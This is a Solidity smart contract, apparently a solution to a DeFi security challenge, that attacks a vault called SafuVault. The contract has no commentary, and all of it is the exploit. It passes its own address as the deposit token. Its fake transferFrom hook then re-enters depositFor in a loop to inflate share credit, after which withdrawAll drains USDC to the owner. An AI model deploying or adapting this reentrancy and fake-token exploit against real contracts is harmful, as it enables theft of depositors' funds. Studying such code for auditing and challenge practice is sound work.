// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface SafuVault {
  function deposit(uint256 _amount) external;
  function depositFor(address token, uint256 _amount, address user) external;
  function withdrawAll() external;
}

contract SafuVaultAttacker {
  address owner;
  SafuVault vault;
  uint256 loopsNumber;
  uint256 amountPerLoop;
  IERC20 usdc;

  constructor(
    address _owner,
    address _vault,
    address _usdc,
    uint256 _loopsNumber,
    uint256 _amountPerLoop
  ) {
    owner = _owner;
    vault = SafuVault(_vault);
    usdc = IERC20(_usdc);
    loopsNumber = _loopsNumber;
    amountPerLoop = _amountPerLoop;
  }

  function attack() external {
    usdc.approve(address(vault), type(uint256).max);
    vault.depositFor(address(this), amountPerLoop, address(this));

    vault.withdrawAll();
    usdc.transfer(address(owner), usdc.balanceOf(address(this)));
  }

  function transferFrom(address from, address to, uint256 amount) external {
    if (loopsNumber > 0) {
      loopsNumber--;
      usdc.transfer(msg.sender, amountPerLoop);
      vault.depositFor(address(this), amountPerLoop, address(this));
    }
  }
}